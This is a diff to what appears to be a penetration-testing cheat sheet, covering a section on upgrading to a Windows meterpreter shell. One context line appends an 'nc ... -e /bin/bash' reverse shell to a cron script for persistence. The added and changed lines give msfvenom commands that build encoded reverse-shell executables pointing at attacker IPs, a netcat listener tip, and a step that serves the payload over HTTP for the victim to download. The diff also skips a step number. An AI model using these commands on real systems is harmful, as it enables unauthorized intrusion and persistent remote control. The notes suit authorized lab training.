@@ -169,11 +169,12 @@ echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
 
 ### Upgrade meterpreter shell Windows
 1. Create a windows TCP reverse shell payload executable
+   NOTE when connecting to windows initially use port 80 for reverse shell and use nc -nvlp 80
 ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe```
 OR
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe```
 
-2. Host the payload on a server from our kali machine (in order to download it from the vul-
+3. Host the payload on a server from our kali machine (in order to download it from the vul-
 nerable machine)
 
 ```python -m http.server 8000 ```
